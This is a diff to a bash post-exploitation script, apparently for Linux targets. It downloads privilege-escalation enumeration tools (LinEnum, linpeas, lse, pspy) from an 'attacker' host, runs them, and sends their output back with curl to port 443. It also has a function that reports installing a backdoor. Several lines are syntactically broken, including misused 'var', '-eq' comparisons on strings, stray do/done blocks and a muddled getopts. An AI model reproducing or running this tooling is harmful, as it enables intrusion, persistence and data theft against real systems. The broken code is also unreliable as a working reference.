@@ -1,23 +1,50 @@
 #!/usr/bin/bash
 
+usage() 
+{ 
+		echo "USAGE:"
+		echo "-i	Attacker IP/Host"
+		echo "-u	Local User to Check"
+		echo "-n 	Specify Path To Local wget/curl binary"	
+}
+
 prep()
 {
+	# Check first argument is supplied. Should be hostname/IP address
 	if [ -z "$1" ]
 	then
 		echo "Host Required"
 		exit
 	fi
 	
+	# Check /dev/shm is available for storing and running scripts
+	# Else use /tmp
 	if [ -d "/dev/shm" ]; then
 		var dir="/dev/shm"
 	else
-		var dir="/dev/tmp"
+		var dir="/tmp"
 	fi
 	
 	mkdir $dir/recon
 	cd $dir/recon
 	
 	# curl or wget?
+	command -v curl >/dev/null 2>&1
+	if [ $? -eq 0 ]; then
+		echo "\n[*] Curl Found. Continuing.\n"
+		dload="curl"
+	else
+		command -v wget >/dev/null 2>&1
+		if [ $? -eq 0 ]; then
+			echo "\n[*] OK. wget found. Continuingd.\n"
+			dload="wget"
+		else
+			echo "\n [!] Neither curl nor wget found. Skipping downloads\n"
+			echo "\n [!] Specify with '-n' \n"
+			dload="null"
+		fi
+	fi
+	
 	# python2 or 3?
 	#command -v foo >/dev/null 2>&1 || { echo "I require foo but it's not installed.  Aborting." >&2; exit 1; }
 	#https://www.cyberciti.biz/faq/unix-linux-shell-find-out-posixcommand-exists-or-not/
@@ -32,6 +59,7 @@ persist()
 		echo "\n[*] OK. Backdoor Installed.\n"
 	else
 		echo "\n [!] Failed. Check Permissions\n"
+		ls -la /var/www
 	fi
 }
 
@@ -69,20 +97,23 @@ quick_enum()
 # Download enumeration scripts and binaries
 download()
 {
-	echo "\n#### Downloading LinEnum.sh ####\n"
-	curl $1/LinEnum.sh
+	if [ $dload -eq "wget" ] ; then
+	do 
+		echo "\n#### Downloading LinEnum.sh ####\n"
+		$dload $1/LinEnum.sh
 	
-	echo "\n#### Downloading psspy ####\n"
-	curl $1/psspy
+		echo "\n#### Downloading psspy ####\n"
+		$dload $1/psspy
 	
-	echo "\n#### Downloading linux-priv-checker ####\n"
-	curl $1/linuxprivchecker.py
+		echo "\n#### Downloading linux-priv-checker ####\n"
+		$dload $1/linuxprivchecker.py
 	
-	echo "\n#### Downloading linpeas.sh ####\n"
-	curl $1/linpeas.sh
+		echo "\n#### Downloading linpeas.sh ####\n"
+		$dload $1/linpeas.sh
 	
-	echo "\n#### Downloading lse.sh ####\n"
-	curl $1/lse.sh
+		echo "\n#### Downloading lse.sh ####\n"
+		$dload $1/lse.sh
+	done
 }
 
 # Execute enum scripts
@@ -100,12 +131,15 @@ execute()
 # Exfiltrate enum script results
 exfiltrate()
 {
-	files=("LinEnum.sh.txt" "linpeas.sh.txt" "lse.sh.txt")
-	
-	for file in "${files[@]}"
+	if [ $dload -eq "curl" ] ; then
 	do
-		echo "\n#### Exfiltrating: $file ####\n" 
-		curl -F "data=@$file" $1:443
+		files=("LinEnum.sh.txt" "linpeas.sh.txt" "lse.sh.txt")
+	
+		for file in "${files[@]}"
+		do
+			echo "\n#### Exfiltrating: $file ####\n" 
+			curl -F "data=@$file" $1:443
+		done
 	done
 }
 
@@ -118,5 +152,16 @@ run()
 	execute
 	exfiltrate
 }
+
+# Get user arguments
+while getopts "h:i:u:n" option; do
+ case "${option}" in
+    i) keyword=${OPTARG};;
+    u) export=${OPTARG};;
+    n) export=${OPTARG};;
+    h) usage; exit;;
+    *) usage; exit;;
+ esac
+done
 
 run
